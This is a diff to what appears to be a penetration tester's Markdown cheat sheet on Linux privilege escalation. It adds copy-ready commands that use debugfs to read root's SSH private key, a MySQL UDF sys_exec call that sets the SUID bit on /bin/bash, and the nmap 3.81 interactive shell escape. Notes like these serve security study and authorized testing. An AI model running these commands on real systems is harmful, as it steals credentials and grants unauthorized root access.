@@ -1,6 +1,11 @@
 # LINUX
 
   
+## For more of the manual enumeration steps;
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
 
 ## Firstly, you can run the script below. It is important that you read the output of this script.
 
@@ -54,10 +59,75 @@ ls -alh /sbin/
 dpkg -l
 ```
 
-## For more of the manual enumeration steps;
 
-https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-https://book.hacktricks.xyz/linux-unix/privilege-escalation
+ 
+## We can use debugfs to enumerate the entire disk with effectively root level privileges.
 
   
+
+```bash
+
+kali@kali:~$ debugfs /dev/sda1
+
+debugfs 1.42.13 (17-May-2015)
+
+debugfs: cd /root
+
+debugfs: ls
+
+debugfs: cd .ssh
+
+debugfs: ls
+
+debugfs: cat id_rsa
+
+  
+
+```
+
+  
+
+
+
+
+### sql udf
+
+  
+
+https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+
+  
+
+Extremely well written, made it a piece of cake to get root..
+
+  
+```
+mysql> use mysql;
+
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+
+mysql> select sys_exec('chmod u+s /bin/bash');
+```
+  
+  
+
+## nmap 3.81  Suid bit
+
+```
+nmap --interactive
+
+nmap --interactive
+
+  
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+
+Welcome to Interactive Mode -- press h <enter> for help
+
+nmap> !whoami
+```
+
+
+
+
   
